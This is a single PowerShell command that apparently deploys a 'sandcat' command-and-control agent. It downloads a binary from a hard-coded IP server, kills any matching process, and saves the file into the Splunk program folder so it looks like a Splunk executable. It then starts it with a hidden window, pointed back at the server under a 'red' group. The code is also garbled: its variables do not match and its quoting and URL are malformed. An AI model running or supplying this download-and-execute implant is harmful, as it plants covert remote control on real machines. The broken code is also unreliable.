$server="http:\\192.169.207.84:8888";$url="$server/file/download";$sc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData(url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace(";"","");get-process | ? {$_.modules.filename -like "C:\Program Files\Splunk\bin\$name.exe"} | stop-process -f;rm -force "C:\Program Files\Splunk\bin\$name.exe" -ea ignore; [io.file]::WriteAllBytes("C:\Program Files\Splunk\bin\$name.exe",$data) | Out-Null;Start-Process -FilePath "C:\Program Files\Splunk\bin\$name.exe" -ArgumentList "-server $server -group red" -WindowStyle hidden;